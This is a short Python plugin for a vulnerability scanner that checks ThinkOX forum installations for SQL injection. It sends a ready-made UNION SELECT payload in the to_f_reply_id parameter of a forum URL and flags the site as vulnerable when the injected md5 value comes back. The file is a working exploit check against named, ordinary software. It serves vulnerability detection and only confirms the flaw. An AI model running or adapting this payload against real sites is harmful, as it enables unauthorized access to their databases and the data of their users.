#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'K0thony' 
def assign(service, arg): 
    if service == "thinkox": 
        return True, arg 

def audit(arg):
    payload = 'index.php?s=/forum/lzl/lzllist/to_f_reply_id/1%20and%201=2)union%20select%201,2,3,4,md5(3.14),6,7,8,9%23.html' 
    verify_url = arg + payload 
    code, head,res, errcode, _ = curl.curl(verify_url) 
    if code == 200 and "4beed3b9c4a886067de0e3a094246f78" in res: 
        security_hole(verify_url)

if __name__ == '__main__': 
    from dummy import * 
    audit(assign('thinkox', 'http://www.example.com/')[1])